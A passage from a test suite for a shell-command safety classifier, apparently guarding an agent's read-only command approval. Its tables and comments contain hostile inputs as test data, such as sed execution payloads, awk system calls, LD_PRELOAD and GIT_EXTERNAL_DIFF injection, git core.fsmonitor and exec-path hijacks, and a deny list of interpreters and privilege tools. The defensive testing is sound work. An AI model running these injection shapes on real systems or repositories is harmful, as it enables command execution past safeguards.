    'git commit -m --help',
    'git commit -F --help',
    'git commit -C --help',
    'git commit -c --help',
    'git commit --reuse-message --help',
    'git commit --fixup --help',
    'git commit -m --dry-run',
    'git commit -n -m message',
    "git commit -m '%G?'",
    'git add -- --help',
    'git add -- --dry-run',
    'touch -- --help',
    'git fetch -n origin',
    'git branch topic',
    'git branch -- topic',
    'git branch --color=always color-topic',
    'git branch --column column-topic',
    'git branch --sort=refname sort-topic',
    "git branch --format='%(refname)' format-topic",
    'git branch -v verbose-topic',
    'git branch --delete topic',
    'git branch -uorigin/main topic',
    'git branch --format --help -d topic',
    'git branch --sort --version --delete topic',
    'git remote set-url origin url',
    'git remote rm origin',
    'git remote prune origin',
    'git diff --output=patch',
    'git log --output=log.out',
    'git show --output=show.out HEAD',
    'git log --output --help',
    'find . -delete',
    'find . -fprint matches',
    'find . -fprint --help',
    'find . -fls --help',
    'find . -fprintf --help format',
    'find . -exec rm {} \\;',
    'find . -exec echo --help {} \\; -delete',
    'find . -exec echo --version {} \\; -delete',
    "sed -i 's/a/b/' file",
    'sed -f script.sed -i file',
    'sed --file=script.sed --in-place=.bak file',
    "sed -- 'wout' input",
    "sed -- 's/a/b/wout' input",
    "sed -I .bak 's/a/b/' file",
    "sed -I.bak 's/a/b/' file",
    "sed -ni.bak 's/a/b/' file",
    "sed -nI.bak 's/a/b/' file",
    "sed 's/a/b/w output' file",
    "sed -e 's/a/b/' -e 'woutput' file",
    "sed 's/a/b/woutput' file",
    "sed 'woutput' file",
    "sed '1woutput' file",
    "sed '/pattern/woutput' file",
    "sed 'W output' file",
    "sed '1W output' file",
    "sed 'p;w output' file",
    "sed 's/a/b/;w output' file",
    "sed 's/a/;/;w output' file",
    "sed -l 80 'w output' file",
    "sed --line-length 80 'w output' file",
    'awk \'{ print > "output" }\' file',
    'awk -- \'BEGIN { print > "out" }\'',
    'awk \'BEGIN { print "x" > "out" }\'',
    'awk \'BEGIN { printf "%s", "x" > "out" }\'',
    'awk \'BEGIN { print a[x] > "out" }\'',
    'awk \'{ print>"output" }\' file',
    'awk -v mode=1 \'BEGIN { print > "out" }\' input',
    'awk \'/pattern/ { print > "out" }\' input',
    'sort -o output input',
    'sort -o --help input',
    'tree -o tree.txt',
    'tree -o --help .',
    'uniq input output',
    'uniq - output',
    'uniq -- -f output',
    'uniq input -- -f',
    'tee output',
    'tee -- -output',
    'tee -a -- -output',
    'dd if=input of=output',
    'echo $(rm target)',
    'FOO=$(rm target)',
    'cat <(rm target)',
    'cat < <(rm target)',
    '< <(rm target) cat',
    '! rm target',
    'cat <<EOF\n$(rm target)\nEOF',
    'FOO=bar rm target',
    'python -c pass; touch target',
    'if true; then rm target; fi',
    'while false; do rm target; done',
    'for item in value; do rm target; done',
  ])('classifies %j as write', async (command) => {
    expect(await classifyShellCommandSafety(command)).toBe('write');
  });

  it.each([
    '',
    'python -c pass',
    'node -e pass',
    'LS -la',
    'printf -v PATH /tmp',
    'printf -xv PATH /tmp',
    'printf "$OPTIONS" value',
    'printf -v PATH /tmp; ls',
    'sudo ls',
    'bash -c ls',
    '/bin/rm target',
    'rm --help',
    'kill -0 123',
    'kill -n 0 123',
    'kill -n 00 123',
    'kill -n0 123',
    'kill -s0 123',
    'kill --signal 0 123',
    'kill -SIG0 123',
    'kill -s SIG0 123',
    'kill --signal=SIG0 123',
    'kill -l',
    'kill --list=TERM',
    'kill --table',
    'kill -V',
    'killall -help',
    'killall -s0 process',
    'killall -sSIG0 process',
    'pkill -0 process',
    'pkill -SIG0 process',
    'pkill --signal 0 process',
    'pkill --signal SIG0 process',
    'kill -s "$SIGNAL" 123',
    'kill -n "$SIGNAL" 123',
    'kill --signal="$SIGNAL" 123',
    'git clean --dry-run',
    'git commit -m -F --help',
    'git commit -m -F --dry-run',
    'git commit --message --file --help',
    'git commit --untracked-files --help',
    'git --config-env=diff.external=HELPER diff',
    'git --paginate log',
    'git -p log',
    'git --unknown-option status',
    'git -- status',
    'git --help commit',
    'git status --help',
    'git log --help',
    'git diff --help',
    'git log --show-signature -1',
    'git show --format=%G? HEAD',
    'GIT_EXTERNAL_DIFF=/tmp/helper git diff',
    'FOO=bar GIT_EXTERNAL_DIFF=/tmp/helper git diff',
    "GIT_EXTERNAL_DIFF='touch /tmp/pwned'; git diff",
    'FOO=bar; ls',
    'FOO=bar ls',
    'LD_PRELOAD=/tmp/evil.so ls',
    'RIPGREP_CONFIG_PATH=/tmp/config rg pattern',
    'PAGER=helper git log',
    'git add -n target',
    'git branch -d topic --help',
    'git branch --list -- -d',
    'git branch -- --list',
    'git branch --sort refname',
    "git branch --format '%(refname)'",
    'git branch --sort refname topic',
    'git branch --format --delete',
    'git branch --sort -d',
    'git diff --output=',
    'git blame --output=blame.out file',
    'git diff --ext-diff',
    'git show --textconv HEAD:file',
    'git grep --open-files-in-pager=less needle',
    'git grep -Ovim needle',
    'git cat-file --filters HEAD:file',
    'git remote prune --dry-run origin',
    'git remote prune -n origin',
    'git remote show remove',
    'git remote get-url prune',
    'find . -exec echo {} \\;',
    'find . -exec echo -delete \\;',
    'find . -fprint --help --help',
    'find . -name -delete',
    'find . -printf -delete',
    'find . -newermt -delete',
    'find . -samefile -delete',
    'find . -mtime -delete',
    'find . -used -delete',
    'find . -- -delete',
    'find . -exec rm --help \\;',
    'sed -f script.sed file',
    'sed -fscript.sed file',
    "sed --in-pl=.bak 's/a/b/' file",
    'sed --f script.sed file',
    'sed -newout input',
    'sed -nEewout input',
    'sed "$SCRIPT" file',
    'sed -e "$SCRIPT" file',
    'sed s/a/*/ file',
    'sed \'s/a/b/\' "$FILE"',
    "sed -i 's/a/b/' --help",
    'sed -e -i file',
    'sed -einstall file',
    'sed -neinstall file',
    "sed -e '' file",
    'sed -f -i file',
    'sed -e-i file',
    'sed -- -i file',
    "sed 's/a/b/e' file",
    "sed 's/a/printf hacked > marker/ep' file",
    "sed 's#a#printf hacked > marker#pe' file",
    "sed 'etouch marker' file",
    "sed '1etouch marker' file",
    "sed 's/a/b/w' file",
    "sed 'w' file",
    "sed '1w' file",
    "sed 'R input' file",
    "sed 's/a/b/' 'w file'",
    "sed 's/a/new value/' file",
    "sed 's/a/blue sky/' file",
    "sed 's/a/car value/' file",
    "sed 's/w /x/' file",
    "sed '/p;w output/p' file",
    "sed 's/a/;w output/' file",
    'awk \'{ system("date") }\'',
    "awk '{ print > output }' file",
    'awk \'BEGIN { print("x")|"cat > output" }\'',
    'awk \'BEGIN { print(1 > "0") }\'',
    'awk \'BEGIN { printf("%d", 1 > "0") }\'',
    'awk \'BEGIN { print "print > " "output" }\'',
    'awk \'BEGIN { print (x) > "out" }\'',
    'awk \'BEGIN { print +(x > "0") }\'',
    'awk \'BEGIN { print a[x > "0"] }\'',
    'awk \'BEGIN { # print > "out"\nprint }\'',
    'awk \'BEGIN { print /x; print y > "out";/ }\'',
    'awk \'BEGIN { print x / 2 > "out" }\'',
    "awk '{ print }' 'print > \"out\"'",
    'awk -fscript.awk file',
    'awk -W exec=script.awk file',
    'awk -Wexec=script.awk file',
    'awk "$PROGRAM" file',
    'awk \'@include "library.awk"\' file',
    'awk \'@namespace "safe"\' file',
    'awk \'BEGIN { fn = "system"; @fn("touch /tmp/pwned") }\'',
    'awk \'BEGIN { fn = "system"; @ fn("touch /tmp/pwned") }\'',
    "awk -e '{ print }' file",
    "awk --load extension '{ print }' file",
    "awk --profile=report '{ print }' file",
    'awk {print*2} file',
    'awk -v x="$VALUE" \'{ print x }\' file',
    'awk \'{ print $NF }\' "$FILE"',
    'uniq *',
    'uniq "$FILES"',
    'sort "$OPTIONS" input',
    'sort {-o,output} input',
    'sort --out=output input',
    'sort -roout input',
    'tree -Cofile .',
    'sort --co=cat input',
    'tree --output=tree.txt',
    'find . "$EXPRESSION"',
    'rg "$OPTIONS" pattern',
    'git status "$OPTIONS"',
    'sort --compress-program gzip input',
    'sort --output=',
    'sort -o output --help',
    'rg --pre cat pattern',
    'rg --hostname-bin=hostname pattern',
    'rg -z pattern archive.gz',
    'ripgrep -iz pattern archive.gz',
    'rg --search-zip pattern archive.gz',
    'less file',
    'more file',
    'tee',
    'dd if=input',
    'echo >& "$target"',
    'cat <> file',
    'echo >',
    'FOO=bar > out',
    'echo $(git status)',
    'FOO=$(git status)',
    'cat <(git status)',
    'if true; then git status; fi',
    'fn() { rm target; }',
  ])('classifies %j as unknown', async (command) => {
    expect(await classifyShellCommandSafety(command)).toBe('unknown');
  });

  it.each([
    'rm target',
    'python -c pass',
    'echo $(git status)',
    'if true; then git status; fi',
    'fn() { rm target; }',
    'git push origin main',
    'git branch --list -- -d',
    'find . -exec echo {} \\;',
    "sed 's/a/b/e' file",
    "sed 's/a/b/' 'w file'",
    "sed 's/w /x/' file",
    'awk \'{ system("date") }\'',
    'git remote show remove',
  ])('does not widen the compatibility boolean for %j', async (command) => {
    expect(await isShellCommandReadOnlyAST(command)).toBe(false);
  });

  it('classifies deeply nested substitutions without repeated traversal', async () => {
    let command = 'git status';
    for (let depth = 0; depth < 30; depth++) command = `echo $(${command})`;
    expect(await classifyShellCommandSafety(command)).toBe('unknown');
  });

  it('classifies deeply nested redirected substitutions without repeated traversal', async () => {
    const commands = ['git status', 'git status'];
    for (let depth = 0; depth < 20; depth++) {
      commands[0] = `echo $(${commands[0]}) < /dev/null`;
      commands[1] = `< <(${commands[1]}) cat`;
    }
    const startedAt = performance.now();
    await expect(
      Promise.all(
        commands.map((command) => classifyShellCommandSafety(command)),
      ),
    ).resolves.toEqual(['unknown', 'unknown']);
    expect(performance.now() - startedAt).toBeLessThan(1000);
  });

  it('classifies adversarial rule inputs in bounded time', async () => {
    const backslashes = '\\'.repeat(10_000);
    const repeatedSed = 'p;'.repeat(10_000);
    const repeatedPrint = 'print value; '.repeat(10_000);
    const repeatedFindExec = '-exec echo \\; '.repeat(10_000);
    const unmatchedBraces = '\\{'.repeat(10_000);
    const commands = [
      `sed 's/${backslashes}a' file`,
      `sed '${repeatedSed}' file`,
      `awk 'BEGIN { print "${backslashes} > output }'`,
      `awk 'BEGIN { ${repeatedPrint} }'`,
      `find . ${repeatedFindExec}`,
      `git status ${unmatchedBraces}`,
    ];
    const startedAt = performance.now();
    await expect(
      Promise.all(
        commands.map((command) => classifyShellCommandSafety(command)),
      ),
    ).resolves.toEqual([
      'unknown',
      'read-only',
      'unknown',
      'read-only',
      'unknown',
      'read-only',
    ]);
    expect(performance.now() - startedAt).toBeLessThan(1000);
  });
});

// =========================================================================
// extraReadOnlyRoots (issue #9694)
// =========================================================================

describe('extraReadOnlyRoots', () => {
  const withIb = { extraReadOnlyRoots: new Set(['ib']) };
  const withGitw = { extraReadOnlyRoots: new Set(['gitw']) };

  it('classifies a vouched root as read-only', async () => {
    expect(await classifyShellCommandSafety('ib domain list', withIb)).toBe(
      'read-only',
    );
    expect(await isShellCommandReadOnlyAST('ib domain list', withIb)).toBe(
      true,
    );
  });

  it('leaves an unvouched root unknown', async () => {
    expect(await classifyShellCommandSafety('ib domain list')).toBe('unknown');
    expect(await classifyShellCommandSafety('other list', withIb)).toBe(
      'unknown',
    );
  });

  it('still blocks redirections from a vouched root', async () => {
    expect(await classifyShellCommandSafety('ib list > out.txt', withIb)).toBe(
      'write',
    );
    expect(await classifyShellCommandSafety('ib list >> out.txt', withIb)).toBe(
      'write',
    );
    expect(await classifyShellCommandSafety('ib list &> out.txt', withIb)).toBe(
      'write',
    );
  });

  it('still flags command substitution and env prefixes', async () => {
    expect(await classifyShellCommandSafety('ib list $(whoami)', withIb)).toBe(
      'unknown',
    );
    expect(await classifyShellCommandSafety('IB_TOKEN=x ib list', withIb)).toBe(
      'unknown',
    );
  });

  it('still flags a pipe into an unknown command', async () => {
    expect(await classifyShellCommandSafety('ib list | badcmd', withIb)).toBe(
      'unknown',
    );
    expect(await classifyShellCommandSafety('ib list | wc -l', withIb)).toBe(
      'read-only',
    );
  });

  it('cannot override a built-in write classification', async () => {
    const vouched = {
      extraReadOnlyRoots: new Set(['rm', 'git', 'tee', 'mv', 'dd']),
    };
    expect(await classifyShellCommandSafety('rm -rf build', vouched)).toBe(
      'write',
    );
    expect(
      await classifyShellCommandSafety('git push origin main', vouched),
    ).toBe('write');
    expect(await classifyShellCommandSafety('tee out.txt', vouched)).toBe(
      'write',
    );
    expect(await classifyShellCommandSafety('mv a b', vouched)).toBe('write');
    expect(await classifyShellCommandSafety('dd of=disk.img', vouched)).toBe(
      'write',
    );
  });

  // Every entry, driven off the exported set so a future edit to the list
  // cannot silently leave a name untested.
  it.each([...NEVER_READ_ONLY_ROOT_COMMANDS])(
    'refuses to vouch %s whatever the caller supplies',
    async (root) => {
      const vouched = { extraReadOnlyRoots: new Set([root]) };
      expect(
        await classifyShellCommandSafety(`${root} --version`, vouched),
      ).toBe('unknown');
      expect(
        await classifyShellCommandSafety(`${root} rm -rf build`, vouched),
      ).toBe('unknown');
    },
  );

  it('refuses a vouched root that wraps a command the classifier knows', async () => {
    // The list above cannot enumerate every launcher, so an unrecognised root
    // handing off to a recognised command must fail closed on shape alone.
    const vouched = { extraReadOnlyRoots: new Set(['obscurelauncher']) };
    for (const command of [
      'obscurelauncher rm -rf build',
      'obscurelauncher /bin/rm -rf build',
      'obscurelauncher bash -c "rm -rf build"',
      'obscurelauncher git push',
    ]) {
      expect(await classifyShellCommandSafety(command, vouched)).toBe(
        'unknown',
      );
    }
    expect(
      await classifyShellCommandSafety(
        'obscurelauncher --json report',
        vouched,
      ),
    ).toBe('read-only');
  });

  it('refuses a vouched root whose arguments are not plain literal words', async () => {
    // Quoting, escaping, expansion and globbing are each an open-ended way to
    // spell a word bash rewrites before the binary sees it, so the vouch is
    // honoured only for arguments whose text is what actually runs.
    const vouched = { extraReadOnlyRoots: new Set(['obscurelauncher']) };
    for (const command of [
      String.raw`obscurelauncher r\m -rf build`,
      `obscurelauncher r'm' -rf build`,
      `obscurelauncher r"m" -rf build`,
      `obscurelauncher "r"m -rf build`,
      'obscurelauncher $cmd -rf build',
      'obscurelauncher ${cmd} -rf build',
      'obscurelauncher * -rf build',
      'obscurelauncher {rm,ls}',
    ]) {
      expect(await classifyShellCommandSafety(command, vouched)).toBe(
        'unknown',
      );
    }
    // Plain words, including paths and option syntax, still classify.
    expect(
      await classifyShellCommandSafety(
        'obscurelauncher --format=json get src/a.txt',
        vouched,
      ),
    ).toBe('read-only');
  });

  it('refuses a vouched root that wraps a specially handled command', async () => {
    // dd, kill, killall, pkill and tee have their own evaluators, so they are
    // in none of the three sets namesAKnownCommand otherwise consults.
    const vouched = { extraReadOnlyRoots: new Set(['obscurelauncher']) };
    for (const command of [
      'obscurelauncher dd of=disk.img',
      'obscurelauncher kill -9 1',
      'obscurelauncher killall node',
      'obscurelauncher pkill -f test',
      'obscurelauncher tee out.txt',
    ]) {
      expect(await classifyShellCommandSafety(command, vouched)).toBe(
        'unknown',
      );
    }
  });

  it('sees through a Windows .exe spelling of a known command', async () => {
    // `.exe` names reach the terminal branch without matching any dispatch
    // arm, so both the root and the argument check strip one trailing suffix.
    expect(
      await classifyShellCommandSafety('git.exe push origin main', {
        extraReadOnlyRoots: new Set(['git.exe']),
      }),
    ).toBe('unknown');
    expect(
      await classifyShellCommandSafety('rm.exe -rf build', {
        extraReadOnlyRoots: new Set(['rm.exe']),
      }),
    ).toBe('unknown');
    expect(
      await classifyShellCommandSafety('ib rm.exe -rf build', withIb),
    ).toBe('unknown');
  });

  it('sees a command name in an =-separated argument', async () => {
    const vouched = { extraReadOnlyRoots: new Set(['obscurelauncher']) };
    for (const command of [
      'obscurelauncher --exec=rm -rf build',
      'obscurelauncher --exec=/bin/rm -rf build',
      'obscurelauncher --exec=rm.exe -rf build',
    ]) {
      expect(await classifyShellCommandSafety(command, vouched)).toBe(
        'unknown',
      );
    }
  });

  // Listing every release of every interpreter is not a finite job, so the
  // versioned spellings are matched by shape.
  it.each([
    'python3.12',
    'python2.7',
    'ruby3.1',
    'perl5',
    'php8.3',
    'lua5.4',
    'tclsh8.6',
    'node20',
    'java17',
    'python3.13t',
    // Named spellings kept as documentation of the real-world shapes; the
    // sweep below is what actually guarantees family coverage.
    'guile-3.0',
    'ghc-9.6.6',
    'lldb-18',
    'ksh93',
    'pypy3.10',
    'zsh5.9',
    'bash5',
    'erl24',
    'sbcl2.4',
    'wish8.6',
    'expect5.45',
    'javac11',
    'pip3.11',
    'rustc-1.75',
    'g++-12',
    'cc-11',
    'clang++-17',
    // `go install golang.org/dl/go1.22.0@latest` installs a binary literally
    // named `go1.22`, so vouching one is routine setup rather than evasion.
    'go1.22',
    'go1.22.0',
    'go-1.22',
    'nodejs18',
    // Upstream tarball, Debian hyphen, and the historical ABI suffix.
    'luajit-2.1.0-beta3',
    'gcc-13',
    'clang-15',
    'c++-14',
    'python3.7m',
  ])('refuses to vouch the versioned interpreter %s', async (root) => {
    expect(
      await classifyShellCommandSafety(`${root} verify.py`, {
        extraReadOnlyRoots: new Set([root]),
      }),
    ).toBe('unknown');
    // And as a wrapped argument of some other vouched root.
    expect(
      await classifyShellCommandSafety(`obscurelauncher ${root} verify.py`, {
        extraReadOnlyRoots: new Set(['obscurelauncher']),
      }),
    ).toBe('unknown');
  });

  it('refuses a versioned spelling of every name on the refusal floor', async () => {
    // The previous shape check was a second hand-written alternation beside
    // `NEVER_READ_ONLY_ROOT_COMMANDS`, and it had drifted within one round:
    // review swept the floor and found 183 names whose `<name>-9.9` spelling
    // was vouchable because nobody had copied the family across. The check is
    // now derived from the floor, so this sweep covers all of it rather than
    // one row per family someone remembered to add.
    // No name is exempt, including the ones that already carry a digit
    // (`python3`, `ksh93`) or an extension (`cmd.exe`).
    for (const root of NEVER_READ_ONLY_ROOT_COMMANDS) {
      for (const versioned of [`${root}-9.9`, `${root}9`]) {
        expect(
          await classifyShellCommandSafety(`${versioned} verify.py`, {
            extraReadOnlyRoots: new Set([versioned]),
          }),
        ).toBe('unknown');
      }
    }
  });

  // The it.each above iterates the very constant it guards, so a deletion
  // would delete its own test. Every entry is spelled out here instead, and
  // the count is asserted both ways: removing a name fails the containment
  // loop, adding one without a deliberate edit here fails the size check.
  const REFUSAL_FLOOR = [
    'ash',
    'bash',
    'busybox',
    'cmd',
    'cmd.exe',
    'csh',
    'dash',
    'fish',
    'ksh',
    'mksh',
    'osh',
    'posh',
    'powershell',
    'pwsh',
    'sh',
    'tcsh',
    'toybox',
    'yash',
    'zsh',
    'bun',
    'bunx',
    'clojure',
    'crystal',
    'dart',
    'deno',
    'dmd',
    'elixir',
    'escript',
    'expect',
    'ghc',
    'groovy',
    'lua',
    'luajit',
    'java',
    'jshell',
    'julia',
    'kotlin',
    'nim',
    'node',
    'nodejs',
    'ocaml',
    'osascript',
    'perl',
    'pnpx',
    'php',
    'python',
    'python3',
    'racket',
    'rscript',
    'ruby',
    'runghc',
    'scala',
    'swift',
    'tclsh',
    'ts-node',
    'tsx',
    'wish',
    'zig',
    'ant',
    'bazel',
    'buck',
    'buck2',
    'bundle',
    'bundler',
    'cargo',
    'cc',
    'c++',
    'clang',
    'guile',
    'tcc',
    'clang++',
    'cmake',
    'conda',
    'go',
    'g++',
    'gcc',
    'composer',
    'dotnet',
    'gem',
    'gradle',
    'grunt',
    'gulp',
    'hatch',
    'javac',
    'just',
    'lein',
    'make',
    'meson',
    'mvn',
    'ninja',
    'nix',
    'nix-build',
    'nix-shell',
    'nox',
    'nx',
    'pants',
    'pdm',
    'pip',
    'pip3',
    'pipenv',
    'pipx',
    'poetry',
    'rake',
    'rustc',
    'rye',
    'sbt',
    'scons',
    'task',
    'tox',
    'turbo',
    'uv',
    'uvx',
    'docker',
    'podman',
    'npm',
    'npx',
    'pnpm',
    'yarn',
    'at',
    'batch',
    'bwrap',
    'crontab',
    'caffeinate',
    'chroot',
    'doas',
    'env',
    'fakeroot',
    'flock',
    'ionice',
    'linux32',
    'linux64',
    'newgrp',
    'nice',
    'nohup',
    'nsenter',
    'parallel',
    'pkexec',
    'run0',
    'runuser',
    'setarch',
    'script',
    'rsh',
    'setsid',
    'sg',
    'ssh',
    'stdbuf',
    'su',
    'sudo',
    'sudoedit',
    'systemd-nspawn',
    'systemd-run',
    'time',
    'timeout',
    'unshare',
    'watch',
    'wine',
    'wsl',
    'wsl.exe',
    'xargs',
    'alias',
    'bind',
    'builtin',
    'command',
    'compgen',
    'complete',
    'coproc',
    'enable',
    'eval',
    'exec',
    'fc',
    'hash',
    'history',
    'getopts',
    'let',
    'mapfile',
    'read',
    'readarray',
    'set',
    'shopt',
    'source',
    '.',
    'trap',
    'unalias',
    // Launchers whose payload is a path argument.
    'proot',
    'run-parts',
    'schroot',
    'setpriv',
    // Siblings of the families above, added after review found each vouchable
    // while its listed family member was not.
    'bpython',
    'ccl',
    'clisp',
    'ecl',
    'elvish',
    'erl',
    'es',
    'gdb',
    'ipython',
    'jruby',
    'jython',
    'ksh88',
    'ksh93',
    'lldb',
    'ltrace',
    'micropython',
    'mruby',
    'nu',
    'oil',
    'py',
    'pypy',
    'pypy3',
    'pythonw',
    'raku',
    'rakudo',
    'rbash',
    'rc',
    'rksh',
    'rzsh',
    'sbcl',
    'strace',
    'truffleruby',
    'valgrind',
    'xonsh',
  ];

  it('pins every entry of the refusal floor against deletion', () => {
    for (const root of REFUSAL_FLOOR) {
      expect(NEVER_READ_ONLY_ROOT_COMMANDS.has(root)).toBe(true);
    }
    expect(new Set(REFUSAL_FLOOR).size).toBe(REFUSAL_FLOOR.length);
    expect(NEVER_READ_ONLY_ROOT_COMMANDS.size).toBe(REFUSAL_FLOOR.length);
  });

  // A refusal list built by family is only as good as its edges: each pair
  // below is one listed name beside the differently-spelled sibling that does
  // the same thing, which is where every round of this review found a gap.
  it.each([
    ['sg', 'newgrp'],
    ['sudo', 'run0'],
    ['cc', 'c++'],
    ['g++', 'clang++'],
    ['chroot', 'bwrap'],
    ['systemd-run', 'systemd-nspawn'],
    ['nsenter', 'setarch'],
    ['npm', 'pip'],
    ['cmake', 'ninja'],
  ])('refuses %s and its sibling %s alike', async (listed, sibling) => {
    for (const root of [listed, sibling]) {
      expect(NEVER_READ_ONLY_ROOT_COMMANDS.has(root)).toBe(true);
      expect(
        await classifyShellCommandSafety(`${root} ./payload`, {
          extraReadOnlyRoots: new Set([root]),
        }),
      ).toBe('unknown');
    }
  });

  it('accepts ordinary path and non-ASCII arguments', async () => {
    // These are the reads the setting exists to stop prompting on. A path
    // segment that happens to match a command name must not refuse the vouch,
    // and neither must a character outside ASCII — every shell metacharacter
    // is ASCII, so a bare word containing one is still literal.
    for (const command of [
      'ib get ./report.json',
      'ib get docs/history/x.md',
      'ib get /abs/report.json',
      'ib get ../up/report.json',
      'ib get 报告.md',
      'ib get café.txt',
      'ib get 文档/报告.md',
      // `.` is the POSIX spelling of `source`, but only in root position —
      // as an argument it is the directory a read-only CLI is pointed at.
      'ib list .',
      'ib list ..',
      'ib list ./',
    ]) {
      expect(await classifyShellCommandSafety(command, withIb)).toBe(
        'read-only',
      );
    }
  });

  it('matches a vouched .exe spelling only where it is the same file', async () => {
    // On Windows PATHEXT makes `mytool` and `mytool.exe` one file, so the
    // acceptance side has to strip `.exe` or the vouch is dead there. On POSIX
    // they are two files, and nobody ships the `.exe` one — so an attacker who
    // can write into any PATH directory owns that name without winning a
    // shadowing race. The refusal side still strips `.exe` on every platform
    // (`git.exe push` stays refused — see the test above); the asymmetry is
    // the point.
    const vouched = { extraReadOnlyRoots: new Set(['mytool']) };
    expect(await classifyShellCommandSafety('mytool list', vouched)).toBe(
      'read-only',
    );
    expect(await classifyShellCommandSafety('mytool.exe list', vouched)).toBe(
      process.platform === 'win32' ? 'read-only' : 'unknown',
    );
  });

  // A vouched wrapper is treated as a possible git frontend, so it must not
  // be able to carry the global options that redirect which repository git
  // reads, which config it applies, or where it resolves its executables —
  // options literal git refuses wholesale via its leading-dash screen.
  it.each([
    'gitw -C attacker status',
    // Attached spellings of the same two options. Real git rejects these
    // (`git.c` matches `-c`/`-C` with strcmp, so `git -C. status` dies with
    // `unknown option` — pinned below), but a vouched wrapper is not git, and
    // one that normalises its own argv before forwarding would hand git back
    // the spaced form.
    'gitw -C. status',
    'gitw -C./attacker status',
    'gitw -C/hostile status',
    'gitw -ccore.fsmonitor=./evil.sh status',
    'gitw -cdiff.external=./evil.sh diff',
    // One option per row: the combined spelling let either arm be deleted
    // from the alternation with the suite still green.
    'gitw --git-dir=attacker/.git status',
    'gitw --work-tree=attacker status',
    'gitw --namespace=x status',
    // `--bare` moves git's config search into the worktree, so the gate probes
    // `.git/config` while execution reads `cwd/config`.
    'gitw --bare diff main..feature',
    'gitw --bare status',
    'gitw --open-files-in-pager log',
    // No hostile checkout needed: the config arrives through argv.
    'gitw -c core.fsmonitor=./evil.sh status',
    'gitw -c diff.external=./evil.sh diff',
    'gitw --config-env=core.fsmonitor=EVIL status',
    // Redirects where git resolves every non-builtin sub-command, and a clone
    // preserves the executable bit, so the payload ships in the repository.
    'gitw --exec-path=./evil request-pull',
    'gitw --exec-path ./evil request-pull',
    // Flags that make a read verb run a helper program.
    'gitw diff --textconv',
    'gitw cat-file --filters',
    'gitw log --show-signature',
    'gitw diff --ext-diff',
    // Write verbs. The wrapper had no sub-command filter at all, so every
    // one of these ran unattended while its literal twin classified `write`.
    'gitw push origin main',
    'gitw reset --hard',
    'gitw checkout main',
    'gitw rebase main',
    'gitw merge feature',
    'gitw stash',
    'gitw tag v1.0',
    'gitw apply --index p.diff',
    'gitw branch -D feature',
    'gitw worktree add ../evil',
    'gitw format-patch -o dir master',
    'gitw archive -o out.tar master',
    // Output redirection on a read verb.
    'gitw diff --output=f',
    'gitw log --output=f',
    'gitw show --output=f',
    // The gpg-helper format specifier, which runs the configured gpg program.
    'gitw log --format=%GG',
    'gitw show --format=%G?',
    'gitw log --format=%GK',
  ])('refuses the vouched git frontend invocation %s', async (command) => {
    expect(
      await classifyShellCommandSafety(command, {
        extraReadOnlyRoots: new Set(['gitw']),
      }),
    ).toBe('unknown');
  });

  it('still accepts a git read verb through a vouched wrapper', async () => {
    // The screen fires on git-shaped invocations, not on every vouched one:
    // the read verbs literal git allows are still allowed here.
    for (const command of [
      'gitw status',
      'gitw diff',
      'gitw log --oneline -10',
      'gitw branch -a',
      'gitw --json status',
    ]) {
      expect(
        await classifyShellCommandSafety(command, {
          extraReadOnlyRoots: new Set(['gitw']),
        }),
      ).toBe('read-only');
    }
  });

  it('refuses the attached -c/-C payload shapes on every vouched root', async () => {
    // Review found four entrances past a git-shaped-only screen: an alias
    // planted through the option makes the first word a non-git verb, the
    // options also work after the verb, they cluster, and an invocation of
    // flags alone has no verb to shape-match at all. So the payload shapes are
    // refused for every vouched invocation, not just recognisably git ones.
    for (const command of [
      'gitw -calias.z=config z core.fsmonitor ./evil.sh', // no git verb
      'gitw status -C./attacker', // after the verb
      'gitw diff -ccore.fsmonitor=./evil.sh', // after the verb
      'gitw -pccore.fsmonitor=./evil.sh status', // clustered
      'gitw -ccore.fsmonitor=./evil.sh', // no verb at all
      'gitw -C/hostile',
      'gitw --no-pager -ccore.fsmonitor=./evil.sh',
      // Cluster-only rows: no `=` anywhere, so `ATTACHED_CONFIG_OR_PATH_OPTION`
      // cannot refuse them first and only the clustered screen can.
      'gitw -pC/hostile status',
      'gitw -pC/hostile',
      // Attached-path rows on a NON-git-shaped invocation, so only the `C.+`
      // branch can refuse them. Both roots are vouched here — running these
      // under `gitw` alone made them pass merely because `ib` was unvouched.
      'ib -Cdir get',
      'ib -C/hostile get',
      // Single-dash `key=value` is git's own `-c` spelling.
      'ib -count=5 list',
    ]) {
      expect(
        await classifyShellCommandSafety(command, {
          extraReadOnlyRoots: new Set(['gitw', 'ib']),
        }),
      ).toBe('unknown');
    }
  });

  it('leaves single-dash flags without a config payload alone', async () => {
    // The screen targets the two payload shapes git's `-c`/`-C` need — a
    // `key=value` and an attached path — rather than every argument starting
    // with `-c`. A CLI's own clustered flags keep working, and `-10` is git's
    // own `git log -<n>` shortcut.
    for (const command of [
      'ib -cp lib get',
      'ib -classpath lib get',
      'ib -abc list',
      'gitw log --oneline -10',
      'gitw branch -a',
      'gitw --version',
      'gitw --json status',
    ]) {
      expect(
        await classifyShellCommandSafety(command, {
          extraReadOnlyRoots: new Set(['ib', 'gitw']),
        }),
      ).toBe('read-only');
    }
  });

  it('pins that literal git rejects the attached -c/-C spellings', async () => {
    // Verified against git 2.50.1: `git -C. status` and
    // `git -ccore.fsmonitor=x status` both exit 129 with `unknown option`,
    // because `handle_options` compares the token with strcmp. Literal git
    // reaches the same refusal here through its leading-dash screen, so the
    // classifier is never more permissive than the binary it models.
    for (const command of [
      'git -C. status',
      'git -ccore.fsmonitor=./evil.sh status',
    ]) {
      expect(await classifyShellCommandSafety(command)).not.toBe('read-only');
    }
  });

  it('refuses the assignment builtins by parse shape even when vouched', async () => {
    // `export`/`unset`/`declare`/`readonly`/`typeset`/`local` are the one
    // planter family NOT in `NEVER_READ_ONLY_ROOT_COMMANDS`: adding them would
    // also make `namesAKnownCommand('export')` true and cost a prompt for a
    // vouched CLI's own `mytool export data`. Their refusal rests on bash's
    // grammar giving them their own node types instead, so it is pinned here —
    // a read-only arm for `declaration_command`, or a tree-sitter update that
    // reparses these spellings, must fail this test rather than silently make
    // `export GIT_DIR=/hostile/.git && gitw status` classify read-only.
    for (const builtin of [
      'export',
      'unset',
      'declare',
      'readonly',
      'typeset',
      'local',
    ]) {
      expect(
        await classifyShellCommandSafety(`${builtin} GIT_DIR=/hostile/.git`, {
          extraReadOnlyRoots: new Set([builtin]),
        }),
      ).toBe('unknown');
      expect(
        await classifyShellCommandSafety(
          `${builtin} GIT_DIR=/hostile/.git && gitw status`,
